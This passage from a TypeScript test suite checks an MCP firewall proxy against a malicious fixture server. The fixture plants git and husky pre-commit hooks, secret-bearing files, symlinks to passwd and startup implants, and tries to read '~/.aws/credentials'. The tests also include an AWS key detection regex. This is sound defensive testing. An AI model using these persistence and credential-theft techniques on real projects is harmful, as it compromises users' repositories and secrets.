    expect(stderr).not.toContain(ARG_SECRET);
  });
});

// ---------------------------------------------------------------------------
// Vertical slice: src/index.ts → interceptor → publishEvent → event bus → monitor SSE
// (tests/monitor.test.ts covers the monitor against its own bus; this covers the wiring.)
// ---------------------------------------------------------------------------

/** A loopback port that was free a moment ago (the schema does not accept port 0). */
async function freePort(): Promise<number> {
  return new Promise((resolvePort, reject) => {
    const server = createServer();
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address() as { port: number };
      server.close(() => resolvePort(port));
    });
  });
}

/** Reads the SSE stream until the monitor's `ready` marker, then disconnects. */
async function readSseBacklog(url: string): Promise<{ event: string; data: unknown }[]> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 5_000);
  try {
    const response = await fetch(url, { signal: controller.signal });
    const reader = response.body!.getReader();
    const decoder = new TextDecoder();
    let raw = '';
    while (!/event: ready\n/.test(raw)) {
      const { value, done } = await reader.read();
      if (done) break;
      raw += decoder.decode(value, { stream: true });
    }
    controller.abort();
    return raw
      .split('\n\n')
      .map((block) => {
        const event = /^event: (.*)$/m.exec(block)?.[1];
        const data = /^data: (.*)$/m.exec(block)?.[1];
        return event && data ? { event, data: JSON.parse(data) as unknown } : undefined;
      })
      .filter((e): e is { event: string; data: unknown } => e !== undefined);
  } finally {
    clearTimeout(timer);
  }
}

describe('proxy / vertical slice: CLI → monitor SSE', () => {
  let dir: string;
  let monitorUrl: string;
  let agent: Client;
  let stderr = '';

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-firewall-slice-'));
    const port = await freePort();
    monitorUrl = `http://127.0.0.1:${port}`;
    const configPath = join(dir, 'firewall.yaml');
    const config = {
      server: {
        id: 'demo',
        command: process.execPath,
        args: ['--import', 'tsx', resolve(repoRoot, 'demo/mock-server.ts')],
        cwd: repoRoot,
        timeoutMs: 10_000,
      },
      monitor: { enabled: true, host: '127.0.0.1', port, maxEvents: 100 },
      policy: loadConfig(resolve(repoRoot, 'config/firewall.yaml')).policy,
    };
    writeFileSync(configPath, JSON.stringify(config, null, 2));
    const transport = new StdioClientTransport({
      command: process.execPath,
      args: ['--import', 'tsx', resolve(repoRoot, 'src/index.ts'), '--config', configPath],
      cwd: repoRoot,
      stderr: 'pipe',
    });
    transport.stderr?.on('data', (chunk: Buffer) => (stderr += chunk.toString()));
    agent = new Client({ name: 'slice-agent', version: '0.0.0' });
    await agent.connect(transport);
  });

  afterAll(async () => {
    await agent?.close().catch(() => {});
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  it('GET /events replays exactly the allowed and the denied call, with no argument values', async () => {
    expect(stderr).toContain(`[firewall] monitor listening on ${monitorUrl}`);
    const health = (await (await fetch(`${monitorUrl}/health`)).json()) as { status: string; protectedServers: number };
    expect(health).toEqual({ status: 'ok', protectedServers: 1 });

    const allowed = (await agent.callTool({ name: 'read_project_file', arguments: { path: 'README.md' } })) as CallToolResult;
    const denied = (await agent.callTool({
      name: 'read_sensitive_file',
      arguments: { path: '~/.aws/credentials', note: ARG_SECRET },
    })) as CallToolResult;
    expect(allowed.isError).toBeFalsy();
    expect(textOf(denied).startsWith(BLOCKED_PREFIX)).toBe(true);

    const sse = await readSseBacklog(`${monitorUrl}/events`);
    const events = sse.filter((e) => e.event === 'firewall').map((e) => e.data as FirewallEvent);
    expect(events.map((e) => [e.toolName, e.decision, e.ruleId])).toEqual([
      ['read_project_file', 'ALLOW', 'APPROVED_TOOL'],
      ['read_sensitive_file', 'DENY', 'PROTECTED_PATH'],
    ]);
    expect(events[1]?.requestId).toBe(metaOf(denied)?.requestId);
    for (const e of events) expect(FirewallEventSchema.safeParse(e).success).toBe(true);
    expect(sse.find((e) => e.event === 'counts')?.data).toEqual({ inspected: 2, allowed: 1, denied: 1 });

    // T11: nothing from the arguments or the mock's secret reaches the stream.
    const raw = JSON.stringify(sse);
    for (const value of ['README.md', 'credentials', ARG_SECRET, MOCK_DUMMY_SECRET]) expect(raw).not.toContain(value);
  });
});

// ---------------------------------------------------------------------------
// Staged writes: interceptor → staged-call → StagingArea, malicious fixture rooted at staging
// ---------------------------------------------------------------------------

const maliciousPath = resolve(import.meta.dirname, 'fixtures/malicious-server.ts');
/** Same value as DUMMY_AWS_KEY in the fixture (not imported: importing would start that server). */
const DUMMY_AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';

const PROJECT_FILES: Record<string, string> = {
  '.env': 'REAL_SECRET=project-only\n',
  'README.md': '# Demo project\n',
  LICENSE: 'MIT\n',
  'docs/guide.md': 'guide\n',
  'src/app.ts': 'export const app = 1;\n',
  'src/run.sh': 'echo run\n',
};

async function makeProject(root: string): Promise<void> {
  for (const [rel, content] of Object.entries(PROJECT_FILES)) {
    await mkdir(join(root, rel, '..'), { recursive: true });
    await writeFile(join(root, rel), content);
  }
  await chmod(join(root, 'src/run.sh'), 0o644);
}

/** type, mode, content hash or link target per path. Excludes (.git/, .env…) are not listed. */
async function fingerprint(root: string, withMode = true): Promise<Record<string, string>> {
  return fingerprintOf(await snapshot(root), withMode);
}

function fingerprintOf(manifest: Map<string, { type: string; mode: number; sha256?: string; linkTarget?: string }>, withMode = true): Record<string, string> {
  return Object.fromEntries(
    [...manifest].map(([p, e]) => [p, `${e.type}:${e.sha256 ?? e.linkTarget ?? ''}${withMode && e.type !== 'dir' ? `:${e.mode.toString(8)}` : ''}`]),
  );
}

async function exists(path: string): Promise<boolean> {
  return lstat(path).then(
    () => true,
    () => false,
  );
}

/** Argument policy for the staged tests: everything is allowed except paths under .git. */
const stagedArgEvaluator: EvaluateToolCall = (ctx) =>
  typeof ctx.arguments.path === 'string' && ctx.arguments.path.startsWith('.git')
    ? { decision: 'DENY', ruleId: 'PROTECTED_PATH', reason: 'Path is protected' }
    : ALLOW;

/** Stand-in for Winston's evaluateFileChanges, so these tests check plumbing, not his rules. */
const testChangeEvaluator: EvaluateFileChanges = (changes, p) =>
  changes.map((c): ChangeDecision => {
    const d = (decision: 'ALLOW' | 'DENY', ruleId: ChangeDecision['ruleId']): ChangeDecision => ({
      path: c.path,
      decision,
      ruleId,
      reason: 'test rule',
    });
    if (p.staging && changes.length > p.staging.maxChangesPerCall) return d('DENY', 'CHANGE_LIMIT');
    if (c.path.startsWith('.git/') || c.path.startsWith('.husky/')) return d('DENY', 'PERSISTENCE_PATH');
    if (c.kind === 'symlink') return d('DENY', 'SYMLINK_DENIED');
    if (c.kind === 'special') return d('DENY', 'WRITE_NOT_ALLOWED');
    if (c.executable === true) return d('DENY', 'EXECUTABLE_DENIED');
    if (c.path !== 'README.md' && !c.path.startsWith('src/')) return d('DENY', 'WRITE_NOT_ALLOWED');
    if (typeof c.text === 'string' && /AKIA[0-9A-Z]{16}/.test(c.text)) return d('DENY', 'SECRET_DETECTED');
    return d('ALLOW', 'APPROVED_TOOL');
  });

interface StagedOptions {
  /** 'default' leaves evaluateFileChanges out of StagingDeps (the reject-all stub). */
  changeEvaluator?: EvaluateFileChanges | 'default';
  timeoutMs?: number;
  startupTamper?: boolean;
  wrapArea?: (area: StagingArea) => StagingAreaLike;
  /** Replaces the forward to the fixture (it still runs inside staging). */
  forward?: InterceptorDeps['forward'];
  onFileChangeEvent?: (event: FileChangeEvent) => void;
  /** false: skip initStaging. */
  init?: boolean;
  /** Sets policy.staging.maxChangesPerCall and the area's excluded-scan bound. */
  maxChangesPerCall?: number;
}

interface StagedStack {
  dir: string;
  project: string;
  area: StagingArea;
  staging: StagingDeps;
  upstream: UpstreamConnection;
  handler: ReturnType<typeof createInterceptor>;
  fileEvents: FileChangeEvent[];
  events: FirewallEvent[];
  logs: string[];
  initial: Awaited<ReturnType<StagingArea['sync']>>;
  close(): Promise<void>;
}

async function startStaged(options: StagedOptions = {}): Promise<StagedStack> {
  const dir = await realpath(await mkdtemp(join(tmpdir(), 'mcp-firewall-staged-')));
  const project = join(dir, 'project');
  await makeProject(project);
  const area = await createStagingArea({
    projectRoot: project,
    stagingParent: dir,
    maxFileBytes: 64 * 1024,
    ...(options.maxChangesPerCall === undefined ? {} : { maxChangesPerCall: options.maxChangesPerCall }),
  });
  const initial = await area.sync();
  const upstream = await connectUpstream(
    { id: 'mal', command: 'unused', args: [], timeoutMs: options.timeoutMs ?? 10_000 },
    {
      launch: {
        mode: 'local',
        command: process.execPath,
        args: ['--import', 'tsx', maliciousPath, '--root', area.stagingRoot],
        cwd: repoRoot,
        ...(options.startupTamper ? { env: { MALICIOUS_STARTUP: '1' } } : {}),
      },
    },
  );
  const fileEvents: FileChangeEvent[] = [];
  const events: FirewallEvent[] = [];
  const logs: string[] = [];
  const changeEvaluator = options.changeEvaluator ?? testChangeEvaluator;
  const staging: StagingDeps = {
    area: options.wrapArea ? options.wrapArea(area) : area,
    lock: new StagingLock(),
    ...(changeEvaluator === 'default' ? {} : { evaluateFileChanges: changeEvaluator }),
    policy:
      options.maxChangesPerCall === undefined
        ? fixturePolicy
        : {
            ...fixturePolicy,
            staging: {
              writablePaths: ['src/**', 'README.md'],
              protectedWritePaths: ['.git/**', '.husky/**'],
              maxFileBytes: 64 * 1024,
              maxChangesPerCall: options.maxChangesPerCall,
            },
          },
    onFileChangeEvent: options.onFileChangeEvent ?? ((e) => fileEvents.push(e)),
  };
  if (options.init !== false) await initStaging(staging, { serverId: 'mal', initial, log: (l) => logs.push(l) });
  const handler = createInterceptor({
    serverId: 'mal',
    policy: fixturePolicy,
    evaluate: stagedArgEvaluator,
    publish: (e) => events.push(e),
    forward: options.forward ?? ((name, args, o) => upstream.callTool(name, args, o)),
    log: (line) => logs.push(line),
    staging,
  });
  return {
    dir,
    project,
    area,
    staging,
    upstream,
    handler,
    fileEvents,
    events,
    logs,
    initial,
    async close() {
      await upstream.close().catch(() => {});
      await rm(dir, { recursive: true, force: true });
    },
  };
}

function stagedOf(result: CallToolResult): StagedMeta | undefined {
  return result._meta?.[STAGED_META_KEY] as StagedMeta | undefined;
}

function allText(result: CallToolResult): string {
  return result.content.map((c) => (c.type === 'text' ? c.text : '')).join('\n');
}

/** Wraps a StagingArea, counting calls and optionally replacing methods. */
function wrapped(area: StagingArea, calls: string[], override: Partial<StagingAreaLike> = {}): StagingAreaLike {
  return {
    sync: () => (calls.push('sync'), override.sync ? override.sync() : area.sync()),
    diff: (before) => (calls.push('diff'), override.diff ? override.diff(before) : area.diff(before)),
    apply: (c, d, p) => (calls.push('apply'), override.apply ? override.apply(c, d, p) : area.apply(c, d, p)),
    revert: (paths) => (calls.push('revert'), override.revert ? override.revert(paths) : area.revert(paths)),
    forcedDenyReason: (path) => area.forcedDenyReason(path),
    removeExcluded: () => (calls.push('removeExcluded'), area.removeExcluded()),
    baselineAfter: (pre, results, restored) => (calls.push('baselineAfter'), area.baselineAfter(pre, results, restored)),
  };
}

describe('proxy / staged writes', () => {
  let stack: StagedStack | undefined;
  afterEach(async () => {
    await stack?.close();
    stack = undefined;
  });

  it('1. baseline without staging: format_readme damages the real project', async () => {
    const dir = await realpath(await mkdtemp(join(tmpdir(), 'mcp-firewall-unstaged-')));
    const project = join(dir, 'project');
    await makeProject(project);
    const upstream = await connectUpstream(
      { id: 'mal', command: 'unused', args: [], timeoutMs: 10_000 },
      { launch: { mode: 'local', command: process.execPath, args: ['--import', 'tsx', maliciousPath, '--root', project], cwd: repoRoot } },
    );
    try {
      const handler = createInterceptor({
        serverId: 'mal',
        policy: fixturePolicy,
        evaluate: stagedArgEvaluator,
        publish: () => {},
        forward: (name, args, o) => upstream.callTool(name, args, o),
        log: () => {},
      });
      const result = await handler('format_readme', {});
      expect(textOf(result)).toBe('README formatted');
      expect(stagedOf(result)).toBeUndefined();
      expect(await exists(join(project, '.git/hooks/pre-commit'))).toBe(true);
      expect(await exists(join(project, '.husky/pre-commit'))).toBe(true);
      expect(await exists(join(project, 'LICENSE'))).toBe(false);
      expect(await readFile(join(project, 'src/config.ts'), 'utf8')).toContain(DUMMY_AWS_KEY);
      expect((await lstat(join(project, 'src/passwd-link'))).isSymbolicLink()).toBe(true);
    } finally {
      await upstream.close();
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('2. an allowed write lands in the real project; the downstream result is passed through with _meta', async () => {
    stack = await startStaged();
    const result = await stack.handler('write_file', { path: 'src/new.ts', content: 'export const n = 1;\n' });
    expect(result.content).toEqual([{ type: 'text', text: 'wrote src/new.ts' }]);
    expect(result.isError).toBeFalsy();
    expect(stagedOf(result)).toEqual({
      applied: 1,
      rejected: 0,
      changes: [{ path: 'src/new.ts', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' }],
    });
    expect(await readFile(join(stack.project, 'src/new.ts'), 'utf8')).toBe('export const n = 1;\n');
    expect(stack.fileEvents).toHaveLength(1);
    expect(stack.fileEvents[0]).toMatchObject({ serverId: 'mal', toolName: 'write_file', applied: 1, rejected: 0 });
  });

  it('3. format_readme: only the README edit is applied; every other change is rejected and reverted', async () => {
    stack = await startStaged();
    const before = await fingerprint(stack.project);
    const result = await stack.handler('format_readme', {});

    expect(stagedOf(result)).toEqual({
      applied: 1,
      rejected: 6,
      changes: [
        { path: '.git/hooks/pre-commit', decision: 'DENY', ruleId: 'PERSISTENCE_PATH' },
        { path: '.husky/pre-commit', decision: 'DENY', ruleId: 'PERSISTENCE_PATH' },
        { path: 'LICENSE', decision: 'DENY', ruleId: 'WRITE_NOT_ALLOWED' },
        { path: 'README.md', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' },
        { path: 'src/config.ts', decision: 'DENY', ruleId: 'SECRET_DETECTED' },
        { path: 'src/passwd-link', decision: 'DENY', ruleId: 'SYMLINK_DENIED' },
        { path: 'src/run.sh', decision: 'DENY', ruleId: 'EXECUTABLE_DENIED' },
      ],
    });
    // .git/ is excluded from staging: the hook is reported and denied, never applied, and removed from staging.
    expect(await exists(join(stack.project, '.git'))).toBe(false);

    const after = await fingerprint(stack.project);
    expect(await readFile(join(stack.project, 'README.md'), 'utf8')).toBe('# Demo project\n\nFormatted.\n');
    expect({ ...after, 'README.md': undefined }).toEqual({ ...before, 'README.md': undefined });

    expect(await fingerprint(stack.area.stagingRoot, false)).toEqual(await fingerprint(stack.project, false));
    expect(await exists(join(stack.area.stagingRoot, '.git'))).toBe(false);

    expect(result.content[0]).toEqual({ type: 'text', text: 'README formatted' });
    const note = result.content[1];
    expect(note?.type === 'text' && note.text.startsWith(REJECTED_CHANGES_PREFIX)).toBe(true);
    expect(allText(result)).toContain('.git/hooks/pre-commit (PERSISTENCE_PATH)');
    expect(allText(result)).toContain('.husky/pre-commit (PERSISTENCE_PATH)');
    expect(allText(result)).toContain('src/config.ts (SECRET_DETECTED)');
    expect(allText(result)).not.toContain(DUMMY_AWS_KEY);
    expect(allText(result)).not.toContain('curl');
  });

  it('4. an argument DENY never forwards, never syncs and emits no FileChangeEvent', async () => {
    const calls: string[] = [];
    stack = await startStaged({ wrapArea: (a) => wrapped(a, calls) });
    calls.length = 0;
    const result = await stack.handler('write_file', { path: '.git/config', content: 'x' });
    expect(textOf(result).startsWith(`${BLOCKED_PREFIX} (PROTECTED_PATH)`)).toBe(true);
    expect(stagedOf(result)).toBeUndefined();
    expect(calls).toEqual([]);
    expect(stack.fileEvents).toEqual([]);
    expect(await counts(stack.upstream)).toEqual({});
  });

  it('5. initStaging reverts startup tampering and reports it; a failing initStaging throws', async () => {
    stack = await startStaged({ startupTamper: true });
    expect(await exists(join(stack.area.stagingRoot, 'src/startup-implant.ts'))).toBe(false);
    expect(await exists(join(stack.project, 'src/startup-implant.ts'))).toBe(false);
    expect(await fingerprint(stack.project)).toEqual(fingerprintOf(stack.initial.project));
    expect(stack.fileEvents).toEqual([
      {
        timestamp: expect.any(String),
        requestId: 'startup',
        serverId: 'mal',
        toolName: '<startup>',
        applied: 0,
        rejected: 1,
        changes: [{ path: 'src/startup-implant.ts', decision: 'DENY', ruleId: 'WRITE_NOT_ALLOWED' }],
      },
    ]);
    // Staged calls work after init.
    const result = await stack.handler('write_file', { path: 'src/ok.ts', content: 'ok\n' });
    expect(stagedOf(result)?.applied).toBe(1);

    const broken: StagingDeps = {
      ...stack.staging,
      area: wrapped(stack.area, [], {
        diff: async () => {
          throw new Error('scan failed');
        },
      }),
    };
    await expect(initStaging(broken, { serverId: 'mal', initial: stack.initial, log: () => {} })).rejects.toThrow(
      'scan failed',
    );
  });

  it('refuses staged calls until initStaging has run', async () => {
    stack = await startStaged({ init: false });
    const result = await stack.handler('write_file', { path: 'src/a.ts', content: 'a' });
    expect(result.isError).toBe(true);
    expect(textOf(result)).toMatch(new RegExp(`^\\${STAGING_ERROR_PREFIX}: staging is not initialized`));
    expect(await counts(stack.upstream)).toEqual({});
  });

  it('6. WRITE_CONFLICT: a project file changed during evaluation keeps the user version', async () => {
    let project = '';
    stack = await startStaged({
      changeEvaluator: (changes, p) => {
        writeFileSync(join(project, 'README.md'), 'edited by the user\n');
        return testChangeEvaluator(changes, p);
      },
    });
    project = stack.project;
    const result = await stack.handler('write_file', { path: 'README.md', content: 'from the server\n' });
    expect(stagedOf(result)).toEqual({
      applied: 0,
      rejected: 1,
      changes: [{ path: 'README.md', decision: 'DENY', ruleId: 'WRITE_CONFLICT' }],
    });
    expect(await readFile(join(stack.project, 'README.md'), 'utf8')).toBe('edited by the user\n');
    expect(await readFile(join(stack.area.stagingRoot, 'README.md'), 'utf8')).toBe('edited by the user\n');
  });

  it('7. late writes are caught by the next call and policy-checked', async () => {
    stack = await startStaged();
    const first = await stack.handler('late_write', { delayMs: 150 });
    expect(stagedOf(first)).toEqual({ applied: 0, rejected: 0, changes: [] });
    expect(stack.fileEvents).toEqual([]);
    await new Promise((r) => setTimeout(r, 500));

    const second = await stack.handler('write_file', { path: 'src/next.ts', content: 'next\n' });
    expect(stagedOf(second)?.changes).toEqual([{ path: 'src/next.ts', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' }]);
    expect(stack.fileEvents.map((e) => [e.toolName, e.changes])).toEqual([
      [
        '<late-writes>',
        [
          { path: '.husky/late', decision: 'DENY', ruleId: 'PERSISTENCE_PATH' },
          { path: 'src/late.ts', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' },
        ],
      ],
      ['write_file', [{ path: 'src/next.ts', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' }]],
    ]);
    expect(stack.fileEvents[0]?.requestId).toMatch(/:late$/);
    expect(await readFile(join(stack.project, 'src/late.ts'), 'utf8')).toBe('export const late = true;\n');
    expect(await exists(join(stack.project, '.husky/late'))).toBe(false);
    expect(await exists(join(stack.area.stagingRoot, '.husky/late'))).toBe(false);
  });

  it('8. a timed-out call is still diffed, and the lock is released for the next call', async () => {
    stack = await startStaged({ timeoutMs: 1_000 });
    const result = await stack.handler('hang', {});
    expect(textOf(result).startsWith(DOWNSTREAM_ERROR_PREFIX)).toBe(true);
    expect(metaOf(result)?.downstreamError).toBe('timeout');
    expect(stagedOf(result)?.changes).toEqual([{ path: 'src/before-hang.ts', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' }]);
    expect(await exists(join(stack.project, 'src/before-hang.ts'))).toBe(true);

    const next = await stack.handler('write_file', { path: 'src/after.ts', content: 'after\n' });
    expect(stagedOf(next)?.applied).toBe(1);
  });

  it('9. a downstream tool error is still diffed', async () => {
    stack = await startStaged();
    const result = await stack.handler('fail_after_write', {});
    expect(result.isError).toBe(true);
    expect(stagedOf(result)?.changes).toEqual([{ path: 'src/partial.ts', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' }]);
    expect(await exists(join(stack.project, 'src/partial.ts'))).toBe(true);
  });

  it('10. a throwing staging area fails closed: nothing applied, later allowed calls refused unforwarded', async () => {
    stack = await startStaged({
      wrapArea: (a) =>
        wrapped(a, [], {
          apply: async () => {
            throw Object.assign(new Error('disk full'), { code: 'ENOSPC' });
          },
        }),
    });
    const before = await fingerprint(stack.project);
    const result = await stack.handler('write_file', { path: 'src/x.ts', content: 'x\n' });
    expect(result.isError).toBe(true);
    expect(textOf(result)).toMatch(new RegExp(`^\\${STAGING_ERROR_PREFIX}: staging failed and file changes were not applied`));
    expect(stagedOf(result)).toBeUndefined();
    expect(await fingerprint(stack.project)).toEqual(before);
    expect(stack.logs.some((l) => l.includes('staging failed: Error code=ENOSPC'))).toBe(true);

    const next = await stack.handler('write_file', { path: 'src/y.ts', content: 'y\n' });
    expect(textOf(next)).toMatch(new RegExp(`^\\${STAGING_ERROR_PREFIX}: staging failed earlier`));
    expect(textOf(next)).toContain('The request was not sent to the tool server');
    expect(await counts(stack.upstream)).toEqual({ write_file: 1 });
  });

  it('reports the paths an apply had already written when it fails partway', async () => {
    let stagingRoot = '';
    stack = await startStaged({
      changeEvaluator: (changes) =>
        changes.map((c) => ({
          path: c.path,
          decision: c.kind === 'delete' ? 'DENY' : 'ALLOW',
          ruleId: c.kind === 'delete' ? 'WRITE_NOT_ALLOWED' : 'APPROVED_TOOL',
          reason: 'test',
        })),
      // Stands in for the server: edits README.md and replaces the docs/ directory with a file.
      forward: async () => {
        await writeFile(join(stagingRoot, 'README.md'), 'edited\n');
        await rm(join(stagingRoot, 'docs'), { recursive: true });
        await writeFile(join(stagingRoot, 'docs'), 'now a file\n');
        return OK_RESULT;
      },
    });
    stagingRoot = stack.area.stagingRoot;
    const result = await stack.handler('anything', {});
    expect(textOf(result)).toContain('except these, applied before the failure: README.md');
    expect(stack.logs.some((l) => l.includes('StagingApplyError') && l.includes('already applied before the failure: README.md'))).toBe(true);
    expect(await readFile(join(stack.project, 'README.md'), 'utf8')).toBe('edited\n');
    expect(await readFile(join(stack.project, 'docs/guide.md'), 'utf8')).toBe('guide\n');
  });

  it('11. an evaluator that throws or returns the wrong length rejects every change', async () => {
    for (const changeEvaluator of [
      (): ChangeDecision[] => {
        throw new Error('rules exploded');
      },
      (): ChangeDecision[] => [],
    ]) {
      stack = await startStaged({ changeEvaluator });
      const result = await stack.handler('write_file', { path: 'src/a.ts', content: 'a\n' });
      expect(stagedOf(result)).toEqual({
        applied: 0,
        rejected: 1,
        changes: [{ path: 'src/a.ts', decision: 'DENY', ruleId: 'EVALUATION_ERROR' }],
      });
      expect(await exists(join(stack.project, 'src/a.ts'))).toBe(false);
      expect(await exists(join(stack.area.stagingRoot, 'src/a.ts'))).toBe(false);
      await stack.close();
      stack = undefined;
    }
  });

  it('the default evaluator (reject-all stub) rejects every change', async () => {
    expect(evaluateFileChangesStub([{ path: 'a', kind: 'add' }], fixturePolicy)[0]?.ruleId).toBe('WRITE_NOT_ALLOWED');
    stack = await startStaged({ changeEvaluator: 'default' });
    const result = await stack.handler('write_file', { path: 'src/a.ts', content: 'a\n' });
    expect(stagedOf(result)?.changes).toEqual([{ path: 'src/a.ts', decision: 'DENY', ruleId: 'WRITE_NOT_ALLOWED' }]);
    expect(await exists(join(stack.project, 'src/a.ts'))).toBe(false);
  });

  it('12. concurrent allowed calls are serialized', async () => {
    const log: string[] = [];
    let upstream: UpstreamConnection | undefined;
    stack = await startStaged({
      forward: async (name, args, o) => {
        log.push(`start ${String(args.path)}`);
        const r = await upstream!.callTool(name, args, o);
        await new Promise((res) => setTimeout(res, 50));
        log.push(`end ${String(args.path)}`);
        return r;
      },
    });
    upstream = stack.upstream;
    const [a, b] = await Promise.all([
      stack.handler('write_file', { path: 'src/a.ts', content: 'a\n' }),
      stack.handler('write_file', { path: 'src/b.ts', content: 'b\n' }),
    ]);
    expect(log).toEqual(['start src/a.ts', 'end src/a.ts', 'start src/b.ts', 'end src/b.ts']);
    expect(stagedOf(a)?.changes.map((c) => c.path)).toEqual(['src/a.ts']);
    expect(stagedOf(b)?.changes.map((c) => c.path)).toEqual(['src/b.ts']);
  });

  it('13. a throwing onFileChangeEvent does not change the result', async () => {
    stack = await startStaged({
      onFileChangeEvent: () => {
        throw new Error('monitor down');
      },
    });
    const result = await stack.handler('write_file', { path: 'src/a.ts', content: 'a\n' });
    expect(result.isError).toBeFalsy();
    expect(stagedOf(result)?.applied).toBe(1);
    expect(stack.logs.some((l) => l.includes('file change event callback failed'))).toBe(true);
  });

  it('14. FileChangeEvents carry no contents and at most 20 changes', async () => {
    stack = await startStaged();
    const result = await stack.handler('write_many', { count: 25 });
    expect(stagedOf(result)).toMatchObject({ applied: 13, rejected: 12 });
    expect(stagedOf(result)?.changes).toHaveLength(25);
    const [event] = stack.fileEvents;
    expect(event).toMatchObject({ applied: 13, rejected: 12 });
    expect(event?.changes).toHaveLength(20);
    const raw = JSON.stringify(stack.fileEvents);
    expect(raw).not.toContain(DUMMY_AWS_KEY);
    expect(raw).not.toContain('"text"');
    expect(raw).not.toContain('export const');
  });

  it('a server-written .env is reported and denied even when the evaluator allows it, and never applied', async () => {
    const allowAll: EvaluateFileChanges = (changes) =>
      changes.map((c) => ({ path: c.path, decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: 'allow all' }));
    let seen: FileChange[] = [];
    stack = await startStaged({
      changeEvaluator: (changes, p) => {
        seen = changes;
        return allowAll(changes, p);
      },
    });
    const result = await stack.handler('write_file', { path: '.env', content: 'SERVER_SECRET=planted\n' });
    expect(seen).toEqual([{ path: '.env', kind: 'add', size: 22, executable: false, text: 'SERVER_SECRET=planted\n' }]);
    expect(stagedOf(result)?.changes).toEqual([{ path: '.env', decision: 'DENY', ruleId: 'WRITE_NOT_ALLOWED' }]);
    expect(await readFile(join(stack.project, '.env'), 'utf8')).toBe('REAL_SECRET=project-only\n');
    expect(await exists(join(stack.area.stagingRoot, '.env'))).toBe(false);
    expect(JSON.stringify(stack.fileEvents)).not.toContain('planted');
  });

  it('a node_modules flood above maxChangesPerCall is rejected as a batch without scanning it all', async () => {
    stack = await startStaged({ maxChangesPerCall: 10 });
    const started = Date.now();
    const result = await stack.handler('flood_node_modules', { count: 500 });
    const staged = stagedOf(result)!;
    expect(staged.changes).toHaveLength(11);
    expect(staged).toMatchObject({ applied: 0, rejected: 11 });
    expect(staged.changes.every((c) => c.decision === 'DENY' && c.ruleId === 'CHANGE_LIMIT')).toBe(true);
    expect(await exists(join(stack.area.stagingRoot, 'node_modules'))).toBe(false);
    expect(await exists(join(stack.project, 'node_modules'))).toBe(false);
    expect(Date.now() - started).toBeLessThan(10_000);
    // Staging is clean again: the next call sees only its own change.
    const next = await stack.handler('write_file', { path: 'src/a.ts', content: 'a\n' });
    expect(stagedOf(next)?.changes).toEqual([{ path: 'src/a.ts', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' }]);
  });

  it(`caps _meta changes and the note at ${MAX_REPORTED_CHANGES}, with true totals`, async () => {
    stack = await startStaged();
    const result = await stack.handler('write_many', { count: 230 });
    const staged = stagedOf(result)!;
    expect(staged).toMatchObject({ applied: 115, rejected: 115, truncated: true });
    expect(staged.changes).toHaveLength(MAX_REPORTED_CHANGES);
    expect(allText(result)).toContain('...and 15 more');
    expect(stack.fileEvents[0]?.changes).toHaveLength(20);

    const small = await stack.handler('write_file', { path: 'src/one.ts', content: '1\n' });
    expect(stagedOf(small)).not.toHaveProperty('truncated');
  });

  it('unsafe file names are reported, denied even when allowed, removed, and do not break staging', async () => {
    let seen: FileChange[] = [];
    stack = await startStaged({
      changeEvaluator: (changes) => {
        seen = changes;
        return changes.map((c) => ({ path: c.path, decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: 'allow all' }));
      },
    });
    const result = await stack.handler('write_unsafe_names', {});
    expect(seen).toEqual([
      { path: '.git/evil%5Cname', kind: 'special', size: 1 },
      { path: 'src/a%5Cb.ts', kind: 'special', size: 1 },
      { path: 'src/bad%1Bname', kind: 'special', size: 1 },
    ]);
    expect(stagedOf(result)?.changes).toEqual([
      { path: '.git/evil%5Cname', decision: 'DENY', ruleId: 'WRITE_NOT_ALLOWED' },
      { path: 'src/a%5Cb.ts', decision: 'DENY', ruleId: 'WRITE_NOT_ALLOWED' },
      { path: 'src/bad%1Bname', decision: 'DENY', ruleId: 'WRITE_NOT_ALLOWED' },
    ]);
    const rawNames = (await readdir(join(stack.area.stagingRoot, 'src'), { encoding: 'buffer' })).map((b) => b.toString('latin1'));
    expect(rawNames.sort()).toEqual(['app.ts', 'run.sh']);
    expect(await exists(join(stack.area.stagingRoot, '.git'))).toBe(false);
    expect((await readdir(join(stack.project, 'src'))).sort()).toEqual(['app.ts', 'run.sh']);

    // Escaped everywhere: no raw ESC or backslash in the note, events or logs.
    const reported = [allText(result), JSON.stringify(stack.fileEvents), stack.logs.join('\n')].join('\n');
    expect(reported).not.toContain('\u001b');
    expect(reported).not.toMatch(/evil\\name|a\\b\.ts/);
    expect(stack.fileEvents.flatMap((e) => e.changes.map((c) => c.path))).toEqual([
      '.git/evil%5Cname',
      'src/a%5Cb.ts',
      'src/bad%1Bname',
    ]);

    const next = await stack.handler('write_file', { path: 'src/ok.ts', content: 'ok\n' });
    expect(next.isError).toBeFalsy();
    expect(stagedOf(next)?.changes).toEqual([{ path: 'src/ok.ts', decision: 'ALLOW', ruleId: 'APPROVED_TOOL' }]);
  });

  // Root can read a mode-000 file, so the "never read" check would prove nothing.
  const runningAsRoot = process.getuid?.() === 0;
  if (runningAsRoot) process.stderr.write('[staged writes] skipping the mode-000 test: running as root, which can read mode-000 files\n');
  it.skipIf(runningAsRoot)('a large excluded file is reported with its size, never read, rejected and removed (skipped as root)', async () => {
    let seen: FileChange[] = [];
    stack = await startStaged({
      changeEvaluator: (changes, p) => {
        seen = changes;
        return testChangeEvaluator(changes, p);
      },
    });
    const bytes = 3 * 1024 * 1024;
    // Mode 000: any open() of it during the diff would fail and break staging.
    const result = await stack.handler('write_big_unreadable', { path: 'node_modules/big/blob.bin', bytes });
    expect(result.isError).toBeFalsy();
    expect(seen).toEqual([{ path: 'node_modules/big/blob.bin', kind: 'add', size: bytes, executable: false, text: null }]);
